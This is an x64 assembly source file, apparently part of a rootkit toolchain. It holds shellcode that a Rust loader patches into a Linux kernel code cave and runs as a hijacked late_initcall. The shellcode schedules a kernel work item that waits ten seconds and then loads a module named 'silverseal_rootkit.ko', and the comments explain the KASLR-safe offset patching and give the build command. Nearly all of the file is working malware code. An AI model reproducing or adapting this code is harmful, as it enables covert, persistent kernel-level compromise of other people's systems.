; lkm_loader.asm
; Position-independent x64 shellcode executed as a Linux kernel late_initcall.
;
; Instead of calling __request_module directly (which would fail because
; userspace is not yet running at late_initcall time), this blob schedules a
; kernel work item and returns immediately. The work item sleeps for 10 seconds
; to let userspace start, then calls __request_module to load the rootkit LKM.
;
; All kernel addresses are encoded as PC-relative rel32 offsets — no absolute
; pointers — making this blob KASLR-safe. The Rust loader scans for 4-byte
; sentinel values and patches them with the correct relative offsets before
; writing the blob into the kernel .data code cave.
;
; Assemble (flat binary):
;   nasm -f bin -o lkm_loader.bin lkm_loader.asm
;
; Blob layout (offsets from blob start):
;   [lkm_loader]        late_initcall entry — initialises work_struct,
;                       calls schedule_work, tail-calls original initcall
;   [lkm_worker]        work function — msleep(10000), then __request_module
;   [work_struct_data]  32-byte struct work_struct (zeroed; patched at runtime)
;   [path_buffer]       256-byte module path "/silverseal_rootkit.ko\0"
;
; Sentinels (patched as i32 PC-relative offsets by Rust before writing blob):
;   SCHEDULE_WORK_REL_SENTINEL   0xAABBCCDD  rel32 in call schedule_work
;   ORIGINAL_FN_REL_SENTINEL     0x12345678  rel32 in jmp  original_initcall
;   MSLEEP_REL_SENTINEL          0x11AABBCC  rel32 in call msleep
;   REQUEST_MODULE_REL_SENTINEL  0xDDEEFF00  rel32 in call __request_module
;
; RIP-relative LEA instructions for work_struct_data, lkm_worker, and
; path_buffer are computed by NASM automatically — no sentinels needed.
;
; Debug: emits on COM1 (0x3F8):
;   'S' — lkm_loader entered
;   'W' — schedule_work returned (work queued)
;   'J' — about to tail-call original initcall
;   'D' — lkm_worker entered (delay starting)
;   'M' — msleep returned (about to call __request_module)
;   'L' — __request_module returned (module load requested)

BITS 64
default rel

; ── COM1 serial helper macro ─────────────────────────────────────────────────
; Emits a single ASCII byte on COM1 (port 0x3F8). Clobbers dx and al only.
%macro SERIAL_CHAR 1
    mov     dx, 0x3F8
    mov     al, %1
    out     dx, al
%endmacro

; ── lkm_loader: late_initcall entry ─────────────────────────────────────────
; Calling convention: Linux x86-64 System V ABI
; On entry:  rsp % 16 == 8  (caller pushed return addr onto aligned stack)
; After push rbp: rsp % 16 == 0 (16-byte aligned before any call)

lkm_loader:
    push    rbp                         ; align rsp for calls below

    SERIAL_CHAR 'S'                     ; checkpoint: shellcode entered

    ; ── Initialise struct work_struct at runtime ──────────────────────────────
    ;
    ; struct work_struct layout (32 bytes):
    ;   [+0]  atomic_long_t data   (8 bytes) — 0 = PENDING_BIT clear, fresh item
    ;   [+8]  list_head entry.next (8 bytes) — must point to &entry for list_empty
    ;   [+16] list_head entry.prev (8 bytes) — same
    ;   [+24] work_func_t func     (8 bytes) — pointer to lkm_worker
    ;
    ; rdi = &work_struct (RIP-relative LEA; NASM computes disp32 automatically)
    lea     rdi, [work_struct_data]
    mov     qword [rdi], 0              ; work.data = 0
    lea     rax, [rdi + 8]             ; rax = &work.entry
    mov     [rdi + 8],  rax            ; entry.next = &entry  (self → list_empty == true)
    mov     [rdi + 16], rax            ; entry.prev = &entry
    lea     rax, [lkm_worker]          ; rax = &lkm_worker (RIP-relative, NASM-computed)
    mov     [rdi + 24], rax            ; work.func = &lkm_worker

    ; ── schedule_work(&work_struct) ───────────────────────────────────────────
    ; rdi already = &work_struct; no other args needed.
    ; rel32 patched by Rust: schedule_work_virt - (loader_cave_virt + off + 4)
    db      0xE8                        ; CALL rel32
    dd      0xAABBCCDD                  ; SCHEDULE_WORK_REL_SENTINEL

    SERIAL_CHAR 'W'                     ; checkpoint: work queued successfully

    pop     rbp

    SERIAL_CHAR 'J'                     ; checkpoint: about to tail-call original

    ; Tail-call original displaced initcall — direct rel32 jmp.
    ; rel32 patched by Rust: original_target_virt - (loader_cave_virt + off + 4)
    db      0xE9                        ; JMP rel32
    dd      0x12345678                  ; ORIGINAL_FN_REL_SENTINEL

; ── lkm_worker: kernel work function ────────────────────────────────────────
; Called by the system workqueue. Sleeps 10 s then loads the rootkit module.
;
; Prototype (work_func_t):  void lkm_worker(struct work_struct *work)
; On entry: rsp % 16 == 8  (kernel's workqueue called us as a normal function)

lkm_worker:
    push    rbp                         ; align rsp

    SERIAL_CHAR 'D'                     ; checkpoint: delay starting

    ; msleep(10000) — block this workqueue thread for 10 seconds.
    ; This thread is not the initcall thread, so the boot continues normally.
    ; rel32 patched by Rust: msleep_virt - (loader_cave_virt + off + 4)
    mov     edi, 10000                  ; arg1: milliseconds
    db      0xE8                        ; CALL rel32
    dd      0x11AABBCC                  ; MSLEEP_REL_SENTINEL

    SERIAL_CHAR 'M'                     ; checkpoint: calling __request_module

    ; __request_module(true, "/silverseal_rootkit.ko")
    ; rel32 patched by Rust: request_module_virt - (loader_cave_virt + off + 4)
    mov     edi, 1                      ; arg1: wait = true
    lea     rsi, [path_buffer]          ; arg2: fmt = path (RIP-relative, NASM-computed)
    xor     eax, eax                    ; al = 0 (variadic: no vector register args)
    db      0xE8                        ; CALL rel32
    dd      0xDDEEFF00                  ; REQUEST_MODULE_REL_SENTINEL
                                        ; return value discarded (void work function)

    SERIAL_CHAR 'L'                     ; checkpoint: module load requested

    pop     rbp
    xor     eax, eax                    ; return 0 (rax ignored; work_func_t is void)
    ret

; ── struct work_struct: 32 bytes, zeroed — patched at runtime ────────────────
work_struct_data:
    times   32 db 0

; ── Path buffer: 256 bytes total ─────────────────────────────────────────────
path_buffer:
    db      "/silverseal_rootkit.ko", 0
    times   (256 - ($ - path_buffer)) db 0
